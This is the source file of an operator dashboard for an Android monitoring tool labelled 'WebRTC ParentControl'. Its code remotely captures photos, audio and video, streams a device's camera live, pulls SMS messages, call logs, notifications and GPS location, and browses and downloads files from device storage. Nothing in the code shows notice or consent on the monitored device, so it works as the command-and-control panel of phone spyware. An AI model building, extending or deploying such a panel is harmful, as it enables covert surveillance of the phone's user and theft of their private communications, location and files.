<?php
session_start();
require_once 'config.php';

if (!isset($_SESSION['admin_id'])) {
    header('Location: login.php'); exit;
}

try {
    $pdo = new PDO(
        'mysql:host=' . DB_HOST . ';dbname=' . DB_NAME . ';charset=utf8mb4',
        DB_USER, DB_PASS,
        [PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION]
    );

    // Auto-cleanup expired media
    $pdo->exec('DELETE FROM media_captures WHERE expires_at IS NOT NULL AND expires_at < NOW()');

    // Stats
    $totalDevices = $pdo->query('SELECT COUNT(*) FROM devices')->fetchColumn();
    $totalImages  = $pdo->query("SELECT COUNT(*) FROM media_captures WHERE media_type='image'")->fetchColumn();
    $totalAudios  = $pdo->query("SELECT COUNT(*) FROM media_captures WHERE media_type='audio'")->fetchColumn();
    $totalVideos  = $pdo->query("SELECT COUNT(*) FROM media_captures WHERE media_type='video'")->fetchColumn();

    $devices = $pdo->query('SELECT * FROM devices ORDER BY last_seen DESC LIMIT 50')->fetchAll(PDO::FETCH_ASSOC);
    $media   = $pdo->query('SELECT * FROM media_captures ORDER BY captured_at DESC LIMIT 30')->fetchAll(PDO::FETCH_ASSOC);
} catch (PDOException $e) {
    die('<h2 style="color:red">DB Error: ' . htmlspecialchars($e->getMessage()) . '</h2>');
}

$nodeUrlJs   = json_encode(NODE_BACKEND_URL);
$uploadToken = defined('UPLOAD_TOKEN') ? json_encode(UPLOAD_TOKEN) : json_encode('');
?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>WebRTC ParentControl Dashboard</title>
<script src="https://cdn.socket.io/4.7.5/socket.io.min.js"></script>
<style>
  * { box-sizing:border-box; margin:0; padding:0; }
  body { font-family: 'Segoe UI', sans-serif; background:#1a1a2e; color:#eee; }
  .navbar { background:#16213e; padding:14px 24px; display:flex; justify-content:space-between; align-items:center; border-bottom:2px solid #e94560; }
  .navbar h1 { color:#e94560; font-size:20px; }
  .nav-links a { color:#aaa; text-decoration:none; margin-left:16px; font-size:14px; }
  .nav-links a:hover { color:#e94560; }
  .container { padding:24px; max-width:1400px; margin:0 auto; }
  .stats { display:grid; grid-template-columns:repeat(4,1fr); gap:16px; margin-bottom:28px; }
  .stat-card { background:#16213e; border-radius:10px; padding:20px; text-align:center; border:1px solid #0f3460; }
  .stat-card .num { font-size:32px; color:#e94560; font-weight:bold; }
  .stat-card .label { font-size:13px; color:#888; margin-top:4px; }
  .section-title { font-size:18px; color:#e94560; margin:24px 0 12px; border-bottom:1px solid #0f3460; padding-bottom:8px; }
  .device-grid { display:grid; grid-template-columns:repeat(auto-fill,minmax(260px,1fr)); gap:16px; }
  .device-card { background:#16213e; border-radius:10px; padding:20px; border:2px solid #0f3460; transition:border-color 0.3s; }
  .device-card.online { border-color:#27ae60; }
  .device-card h3 { font-size:14px; color:#eee; margin-bottom:4px; word-break:break-all; }
  .device-card .ts { font-size:11px; color:#666; margin-bottom:14px; }
  .btn-row { display:flex; flex-wrap:wrap; gap:6px; }
  .btn { padding:7px 12px; border:none; border-radius:6px; cursor:pointer; font-size:12px; font-weight:bold; }
  .btn-live  { background:#e94560; color:#fff; }
  .btn-photo { background:#3498db; color:#fff; }
  .btn-audio { background:#9b59b6; color:#fff; }
  .btn-video { background:#e67e22; color:#fff; }
  .btn-torch { background:#f1c40f; color:#333; }
  .btn:hover { opacity:0.85; }
  #live-section { background:#16213e; border-radius:10px; padding:20px; margin:24px 0; display:none; }
  #remote-video { width:100%; max-width:720px; border-radius:8px; background:#000; display:block; margin:0 auto; }
  .tabs { display:flex; gap:8px; margin-bottom:16px; flex-wrap:wrap; }
  .tab { padding:8px 18px; border-radius:6px; cursor:pointer; font-size:13px; background:#0f3460; color:#aaa; border:none; }
  .tab.active { background:#e94560; color:#fff; }
  .tab-content { display:none; }
  .tab-content.active { display:block; }
  .media-grid { display:grid; grid-template-columns:repeat(auto-fill,minmax(220px,1fr)); gap:14px; }
  .media-card { background:#0f3460; border-radius:8px; overflow:hidden; }
  .media-card img, .media-card video { width:100%; display:block; max-height:160px; object-fit:cover; }
  .media-card audio { width:100%; padding:8px; }
  .media-info { padding:10px; font-size:11px; color:#aaa; }
  .media-info .dev { color:#e94560; font-weight:bold; }
  .media-actions { display:flex; gap:6px; padding:0 10px 10px; }
  .media-actions a, .media-actions button { font-size:11px; padding:4px 10px; border-radius:4px; text-decoration:none; border:none; cursor:pointer; }
  .media-actions a { background:#27ae60; color:#fff; }
  .media-actions button { background:#c0392b; color:#fff; }
  #sms-feed, #call-feed, #notif-feed { max-height:400px; overflow-y:auto; }
  .sms-item, .call-item, .notif-item { background:#0f3460; border-radius:6px; padding:12px; margin-bottom:8px; font-size:13px; }
  .sms-item .from { color:#3498db; font-weight:bold; }
  .call-item .number { color:#27ae60; font-weight:bold; }
  .notif-item .app { color:#e67e22; font-weight:bold; }
  #gps-map { width:100%; height:400px; border-radius:8px; background:#0f3460; display:flex; align-items:center; justify-content:center; color:#888; }
  #gps-coords { font-size:13px; color:#aaa; margin-bottom:10px; }
  .status-bar { background:#16213e; padding:8px 24px; font-size:12px; color:#888; border-top:1px solid #0f3460; position:fixed; bottom:0; left:0; right:0; }
  .status-bar span { margin-right:20px; }
  #conn-status { color:#e94560; }
  @media(max-width:600px) { .stats { grid-template-columns:repeat(2,1fr); } }
</style>
</head>
<body>

<div class="navbar">
  <h1>📱 WebRTC ParentControl</h1>
  <div class="nav-links">
    <a href="#">Dashboard</a>
    <a href="logout.php">🚪 Logout (<?= htmlspecialchars($_SESSION['admin_user'] ?? 'admin') ?>)</a>
  </div>
</div>

<div class="container">

  <!-- Stats -->
  <div class="stats">
    <div class="stat-card"><div class="num"><?= $totalDevices ?></div><div class="label">📱 Devices</div></div>
    <div class="stat-card"><div class="num"><?= $totalImages  ?></div><div class="label">📷 Images</div></div>
    <div class="stat-card"><div class="num"><?= $totalAudios  ?></div><div class="label">🎤 Audio</div></div>
    <div class="stat-card"><div class="num"><?= $totalVideos  ?></div><div class="label">🎥 Video</div></div>
  </div>

  <!-- Connected Devices -->
  <div class="section-title">📱 Connected Devices</div>
  <div class="device-grid" id="device-grid">
    <?php foreach ($devices as $dev): ?>
    <div class="device-card" id="card-<?= htmlspecialchars($dev['device_id']) ?>">
      <h3><?= htmlspecialchars($dev['device_id']) ?></h3>
      <div class="ts">Last seen: <?= htmlspecialchars($dev['last_seen'] ?? 'Never') ?></div>
      <div class="btn-row">
        <button class="btn btn-live"  onclick="startLive('<?= htmlspecialchars($dev['device_id']) ?>')">&#9654; Live</button>
        <button class="btn btn-photo" onclick="captureImage('<?= htmlspecialchars($dev['device_id']) ?>')">&#128247; Photo</button>
        <button class="btn btn-audio" onclick="captureAudio('<?= htmlspecialchars($dev['device_id']) ?>')">&#127908; Audio</button>
        <button class="btn btn-video" onclick="captureVideo('<?= htmlspecialchars($dev['device_id']) ?>')">&#127910; Video</button>
        <button class="btn btn-torch" onclick="toggleTorch('<?= htmlspecialchars($dev['device_id']) ?>')">&#128294; Torch</button>
      </div>
    </div>
    <?php endforeach; ?>
    <?php if (empty($devices)): ?>
    <div style="color:#666;font-size:13px;padding:20px;">No devices connected yet. Install the APK on a device to begin.</div>
    <?php endif; ?>
  </div>

  <!-- Live View -->
  <div id="live-section">
    <div class="section-title">📺 Live View — <span id="live-device-label"></span>
      <button onclick="stopLive()" style="float:right;background:#e94560;color:#fff;border:none;padding:6px 14px;border-radius:6px;cursor:pointer;font-size:12px;">Stop</button>
    </div>
    <video id="remote-video" autoplay playsinline controls></video>
  </div>

  <!-- Data Tabs -->
  <div class="section-title">📁 Data &amp; Media</div>
  <div class="tabs">
    <button class="tab active" onclick="switchTab('media')">📸 Media Gallery</button>
    <button class="tab" onclick="switchTab('sms')">💬 SMS</button>
    <button class="tab" onclick="switchTab('calls')">📞 Calls</button>
    <button class="tab" onclick="switchTab('notif')">🔔 Notifications</button>
    <button class="tab" onclick="switchTab('gps')">🗺 GPS</button>
    <button class="tab" onclick="switchTab('files')">📂 Files</button>
  </div>

  <div id="tab-media" class="tab-content active">
    <div class="media-grid">
      <?php foreach ($media as $m): ?>
      <div class="media-card">
        <?php if ($m['media_type'] === 'image'): ?>
          <img src="<?= htmlspecialchars($m['file_path']) ?>" loading="lazy" alt="capture">
        <?php elseif ($m['media_type'] === 'video'): ?>
          <video src="<?= htmlspecialchars($m['file_path']) ?>" controls></video>
        <?php else: ?>
          <audio src="<?= htmlspecialchars($m['file_path']) ?>" controls></audio>
        <?php endif; ?>
        <div class="media-info">
          <div class="dev"><?= htmlspecialchars($m['device_id']) ?></div>
          <div><?= htmlspecialchars($m['captured_at']) ?></div>
          <div><?= round($m['file_size'] / 1024, 1) ?> KB</div>
        </div>
        <div class="media-actions">
          <a href="<?= htmlspecialchars($m['file_path']) ?>" download>&#11123; Download</a>
          <button onclick="deleteMedia(<?= (int)$m['id'] ?>)">&#10006; Delete</button>
        </div>
      </div>
      <?php endforeach; ?>
      <?php if (empty($media)): ?>
      <p style="color:#666;font-size:13px;padding:10px;">No media captures yet.</p>
      <?php endif; ?>
    </div>
  </div>

  <div id="tab-sms"   class="tab-content"><div id="sms-feed"><p style="color:#666;padding:20px;">Waiting for SMS data…</p></div></div>
  <div id="tab-calls" class="tab-content"><div id="call-feed"><p style="color:#666;padding:20px;">Waiting for call log…</p></div></div>
  <div id="tab-notif" class="tab-content"><div id="notif-feed"><p style="color:#666;padding:20px;">Waiting for notifications…</p></div></div>
  <div id="tab-gps"   class="tab-content">
    <div id="gps-coords">Waiting for GPS…</div>
    <div id="gps-map">GPS coordinates will appear here. Integrate Google Maps JS API for a map view.</div>
  </div>
  <div id="tab-files" class="tab-content">
    <div id="file-browser">
      <div style="margin-bottom:12px;">
        <input id="fs-path" type="text" value="/storage/emulated/0/" style="background:#0f3460;color:#eee;border:1px solid #444;border-radius:6px;padding:8px 12px;width:60%;font-size:13px;" />
        <button onclick="fsListPath()" style="background:#3498db;color:#fff;border:none;padding:9px 18px;border-radius:6px;cursor:pointer;font-size:13px;">Browse</button>
      </div>
      <div id="fs-listing" style="background:#0f3460;border-radius:8px;padding:16px;min-height:200px;font-size:13px;color:#aaa;">Select a device and browse path above.</div>
    </div>
  </div>

</div><!-- /container -->

<div class="status-bar">
  <span>&#128329; Server: <span id="conn-status">Disconnected</span></span>
  <span>&#128241; Active device: <span id="active-device">None</span></span>
  <span>&#128250; Stream: <span id="stream-status">Off</span></span>
</div>

<script>
// =============================================================================
// Configuration
// =============================================================================
const NODE_URL    = <?= $nodeUrlJs ?>;
const UPLOAD_URL  = 'upload_media.php';
const DELETE_URL  = 'delete_media.php';

// =============================================================================
// FIX Bug 5 — RTCPeerConnection ICE configuration
// The old code used `new RTCPeerConnection()` with NO iceServers, so WebRTC
// only worked on the same local network. Fails on mobile data, NAT, VPN,
// corporate networks, or different ISPs.
//
// Now uses the same 8 STUN/TURN servers as Android StreamingService.java:
//   • 3 Google STUN (free, no auth)
//   • 2 freestun TURN (free, username:free / password:free)
//   • 3 OpenRelay TURN including TURNS-over-443-TCP for strict firewalls
// =============================================================================
const ICE_CONFIG = {
  iceServers: [
    { urls: 'stun:stun.l.google.com:19302' },
    { urls: 'stun:stun1.l.google.com:19302' },
    { urls: 'stun:stun2.l.google.com:19302' },
    { urls: 'turn:freestun.net:3478',                            username: 'free',             credential: 'free' },
    { urls: 'turns:freestun.net:5349',                           username: 'free',             credential: 'free' },
    { urls: 'turn:global.relay.metered.ca:80',                   username: 'openrelayproject', credential: 'openrelayproject' },
    { urls: 'turn:global.relay.metered.ca:443',                  username: 'openrelayproject', credential: 'openrelayproject' },
    { urls: 'turns:global.relay.metered.ca:443?transport=tcp',   username: 'openrelayproject', credential: 'openrelayproject' }
  ],
  iceCandidatePoolSize: 10
};

// =============================================================================
// Socket.IO
// =============================================================================
const socket = io(NODE_URL, {
  reconnection:       true,
  reconnectionDelay:  2000,
  reconnectionDelayMax: 10000,
  reconnectionAttempts: Infinity
});

let activeDeviceId = null;
let pc             = null;
let torchState     = {};

socket.on('connect',    () => { setConnStatus('Connected ✅', '#27ae60'); });
socket.on('disconnect', () => { setConnStatus('Disconnected 🔴', '#e94560'); });

socket.on('device-list-update', (ids) => {
  document.querySelectorAll('.device-card').forEach(card => card.classList.remove('online'));
  ids.forEach(id => {
    const el = document.getElementById('card-' + id);
    if (el) el.classList.add('online');
  });
});

// =============================================================================
// WebRTC — receive offer from Android, send answer
// FIX Bug 5: RTCPeerConnection now created with ICE_CONFIG every time
// =============================================================================
socket.on('signal', (data) => {
  const sig = data && data.signal;
  if (!sig) return;

  if (sig.type === 'offer') {
    if (!pc) createPeerConnection(data.from);
    pc.setRemoteDescription({ type: 'offer', sdp: sig.sdp })
      .then(() => pc.createAnswer())
      .then(ans => pc.setLocalDescription(ans))
      .then(() => {
        socket.emit('signal', {
          to:     data.from,
          from:   socket.id,
          signal: { type: 'answer', sdp: pc.localDescription.sdp }
        });
      })
      .catch(e => console.error('Answer failed:', e));

  } else if (sig.type === 'answer') {
    pc && pc.setRemoteDescription({ type: 'answer', sdp: sig.sdp })
            .catch(e => console.error('setRemoteDescription answer:', e));

  } else if (sig.candidate) {
    pc && pc.addIceCandidate(sig.candidate)
            .catch(e => console.error('addIceCandidate:', e));
  }
});

// Legacy offer/answer events (Kotlin path)
socket.on('offer', (data) => {
  if (!pc) createPeerConnection(data.from);
  pc.setRemoteDescription({ type: 'offer', sdp: data.sdp })
    .then(() => pc.createAnswer())
    .then(ans => pc.setLocalDescription(ans))
    .then(() => socket.emit('answer', { to: data.from, sdp: pc.localDescription.sdp }))
    .catch(e => console.error('Legacy answer failed:', e));
});
socket.on('answer',        (d) => pc && pc.setRemoteDescription({ type:'answer', sdp:d.sdp }).catch(console.error));
socket.on('ice-candidate', (d) => pc && pc.addIceCandidate(d.candidate).catch(console.error));

function createPeerConnection(remoteId) {
  if (pc) { try { pc.close(); } catch(e){} }
  // FIX Bug 5: use full ICE_CONFIG with STUN + TURN servers
  pc = new RTCPeerConnection(ICE_CONFIG);
  pc.ontrack = (e) => {
    const vid = document.getElementById('remote-video');
    if (vid.srcObject !== e.streams[0]) vid.srcObject = e.streams[0];
    document.getElementById('stream-status').textContent = 'Live 🟢';
  };
  pc.onicecandidate = (e) => {
    if (e.candidate) {
      socket.emit('signal', {
        to:     remoteId,
        from:   socket.id,
        signal: { candidate: e.candidate }
      });
      socket.emit('ice-candidate', { to: remoteId, candidate: e.candidate });
    }
  };
  pc.onconnectionstatechange = () => {
    document.getElementById('stream-status').textContent =
      pc.connectionState === 'connected'    ? 'Live 🟢' :
      pc.connectionState === 'disconnected' ? 'Disconnected 🔴' :
      pc.connectionState === 'failed'       ? 'Failed ❌' : pc.connectionState;
  };
}

// =============================================================================
// Live View
// =============================================================================
function startLive(deviceId) {
  activeDeviceId = deviceId;
  document.getElementById('live-device-label').textContent = deviceId;
  document.getElementById('live-section').style.display = 'block';
  document.getElementById('active-device').textContent = deviceId;
  createPeerConnection(deviceSockets_lookup(deviceId) || deviceId);
  socket.emit('join-as-controller', { deviceId });
}

function stopLive() {
  if (pc) { try { pc.close(); } catch(e){} pc = null; }
  const vid = document.getElementById('remote-video');
  vid.srcObject = null;
  document.getElementById('live-section').style.display = 'none';
  document.getElementById('stream-status').textContent  = 'Off';
  document.getElementById('active-device').textContent  = 'None';
  activeDeviceId = null;
}

function deviceSockets_lookup(deviceId) {
  // Best-effort: return deviceId as socket.id if it was registered via 'identify'
  return deviceId;
}

// =============================================================================
// Capture commands
// =============================================================================
function captureImage(deviceId) {
  socket.emit('capture-image', { deviceId, camera: 'front' });
  showToast('📷 Photo requested...');
}
function captureAudio(deviceId) {
  socket.emit('capture-audio', { deviceId, duration: 10 });
  showToast('🎤 Audio recording requested...');
}
function captureVideo(deviceId) {
  socket.emit('capture-video', { deviceId, duration: 15, camera: 'back' });
  showToast('🎥 Video recording requested...');
}
function toggleTorch(deviceId) {
  torchState[deviceId] = !torchState[deviceId];
  socket.emit('torch', { deviceId, on: torchState[deviceId] });
  showToast('💡 Torch ' + (torchState[deviceId] ? 'ON' : 'OFF'));
}

// =============================================================================
// Media received from device
// =============================================================================
socket.on('media-ready', (data) => {
  if (!data || !data.base64) return;
  const blob     = b64toBlob(data.base64, data.mimeType || 'application/octet-stream');
  const formData = new FormData();
  formData.append('file',       blob,        data.filename || 'capture');
  formData.append('device_id',  data.deviceId);
  formData.append('media_type', data.type || 'image');
  fetch(UPLOAD_URL, { method: 'POST', body: formData })
    .then(r => r.json())
    .then(r => { if (r.success) { showToast('✅ Media saved'); setTimeout(() => location.reload(), 1500); } })
    .catch(e => console.error('Upload failed:', e));
});

function b64toBlob(b64, mime) {
  const bytes  = atob(b64);
  const arr    = new Uint8Array(bytes.length);
  for (let i = 0; i < bytes.length; i++) arr[i] = bytes.charCodeAt(i);
  return new Blob([arr], { type: mime });
}

// =============================================================================
// Live data feeds
// =============================================================================
socket.on('sms', (data) => {
  const feed = document.getElementById('sms-feed');
  if (!data || !data.sms_messages) return;
  data.sms_messages.slice(0, 20).forEach(sms => {
    const d = document.createElement('div');
    d.className = 'sms-item';
    d.innerHTML = `<div class="from">${esc(sms.address || '?')}</div>
                   <div>${esc(sms.body || '')}</div>
                   <div style="color:#666;font-size:11px;">${new Date(parseInt(sms.date||0)).toLocaleString()}</div>`;
    feed.prepend(d);
    if (feed.children.length > 50) feed.removeChild(feed.lastChild);
  });
});

socket.on('call_log', (data) => {
  const feed = document.getElementById('call-feed');
  if (!data || !data.call_logs) return;
  data.call_logs.slice(0, 20).forEach(call => {
    const d = document.createElement('div');
    d.className = 'call-item';
    d.innerHTML = `<div class="number">${esc(call.number || '?')}</div>
                   <div>${esc(call.type || '')} — ${esc(call.duration || '0')}s</div>
                   <div style="color:#666;font-size:11px;">${new Date(parseInt(call.date||0)).toLocaleString()}</div>`;
    feed.prepend(d);
    if (feed.children.length > 50) feed.removeChild(feed.lastChild);
  });
});

socket.on('notification', (data) => {
  const feed = document.getElementById('notif-feed');
  if (!data || !data.notification) return;
  const n = data.notification;
  const d = document.createElement('div');
  d.className = 'notif-item';
  d.innerHTML = `<div class="app">${esc(n.appName || '?')}</div>
                 <div><b>${esc(n.title||'')}</b></div>
                 <div>${esc(n.text||'')}</div>
                 <div style="color:#666;font-size:11px;">${new Date(parseInt(n.timestamp||0)).toLocaleString()}</div>`;
  feed.prepend(d);
  if (feed.children.length > 100) feed.removeChild(feed.lastChild);
});

socket.on('location', (data) => {
  document.getElementById('gps-coords').textContent =
    `📍 ${data.deviceId} — Lat: ${data.latitude}, Lng: ${data.longitude} — ${new Date(data.time||Date.now()).toLocaleTimeString()}`;
  document.getElementById('gps-map').innerHTML =
    `<a href="https://maps.google.com/?q=${data.latitude},${data.longitude}" target="_blank"
        style="color:#3498db;font-size:15px;">🗺 Open in Google Maps: ${data.latitude}, ${data.longitude}</a>`;
});

// =============================================================================
// File Explorer
// =============================================================================
let fsDeviceId = null;

function fsListPath() {
  const path = document.getElementById('fs-path').value.trim();
  fsDeviceId = activeDeviceId;
  if (!fsDeviceId) { alert('Start Live View first to select a device.'); return; }
  socket.emit('fs:list', { deviceId: fsDeviceId, path });
}

socket.on('fs:list_result', (data) => {
  const listing = document.getElementById('fs-listing');
  if (!data || !data.file_list) { listing.innerHTML = '<p style="color:#e94560;">No result.</p>'; return; }
  const { currentPath, files } = data.file_list;
  let html = `<div style="color:#aaa;margin-bottom:8px;">&#128193; ${esc(currentPath)}</div>`;
  if (!files || files.length === 0) { html += '<p style="color:#666;">Empty directory.</p>'; }
  files && files.forEach(f => {
    const icon = f.isDir ? '📁' : '📄';
    html += `<div style="padding:5px 0;border-bottom:1px solid #1a3a5c;cursor:pointer;" onclick="${f.isDir ? `fsNavigate('${esc(f.path)}')` : `fsDownload('${esc(f.path)}')`}">
               ${icon} ${esc(f.name)} <span style="color:#666;font-size:11px;float:right;">${f.isDir ? '' : fmtSize(f.size)}</span>
             </div>`;
  });
  listing.innerHTML = html;
});

function fsNavigate(path) {
  document.getElementById('fs-path').value = path;
  fsListPath();
}

function fsDownload(path) {
  if (!fsDeviceId) return;
  socket.emit('fs:download', { deviceId: fsDeviceId, path });
  showToast('⏬ Download started...');
}

let fsDownloads = {};
socket.on('fs:download_start',    (d) => { fsDownloads[d.fileId] = { chunks: [], total: d.totalChunks, name: d.name }; });
socket.on('fs:download_chunk',    (d) => { if (fsDownloads[d.fileId]) fsDownloads[d.fileId].chunks[d.chunkIndex] = d.content; });
socket.on('fs:download_complete', (d) => {
  const dl = fsDownloads[d.fileId];
  if (!dl) return;
  const b64    = dl.chunks.join('');
  const blob   = b64toBlob(b64, 'application/octet-stream');
  const url    = URL.createObjectURL(blob);
  const a      = document.createElement('a');
  a.href       = url;
  a.download   = dl.name;
  a.click();
  URL.revokeObjectURL(url);
  delete fsDownloads[d.fileId];
  showToast('✅ File downloaded: ' + dl.name);
});
socket.on('fs:download_error', (d) => { showToast('❌ Download error: ' + (d.error || 'unknown')); });

// =============================================================================
// Media delete
// =============================================================================
function deleteMedia(id) {
  if (!confirm('Delete this media?')) return;
  fetch(DELETE_URL + '?id=' + id, { method: 'POST' })
    .then(r => r.json())
    .then(r => { if (r.success) location.reload(); });
}

// =============================================================================
// Tabs
// =============================================================================
function switchTab(name) {
  document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
  document.querySelectorAll('.tab-content').forEach(c => c.classList.remove('active'));
  document.querySelector(`button[onclick="switchTab('${name}')"]`).classList.add('active');
  const el = document.getElementById('tab-' + name);
  if (el) el.classList.add('active');
}

// =============================================================================
// Helpers
// =============================================================================
function setConnStatus(text, color) {
  const el = document.getElementById('conn-status');
  el.textContent = text;
  el.style.color = color;
}

function esc(s) {
  return String(s)
    .replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;')
    .replace(/"/g,'&quot;').replace(/'/g,'&#39;');
}

function fmtSize(bytes) {
  if (!bytes) return '0 B';
  const k = 1024, sz = ['B','KB','MB','GB'];
  const i = Math.floor(Math.log(bytes) / Math.log(k));
  return parseFloat((bytes / Math.pow(k, i)).toFixed(1)) + ' ' + sz[i];
}

function showToast(msg) {
  const t = document.createElement('div');
  t.textContent = msg;
  t.style.cssText = 'position:fixed;bottom:50px;right:20px;background:#16213e;color:#eee;' +
                    'padding:10px 18px;border-radius:8px;border:1px solid #e94560;font-size:13px;z-index:999;';
  document.body.appendChild(t);
  setTimeout(() => t.remove(), 3000);
}
</script>
</body>
</html>
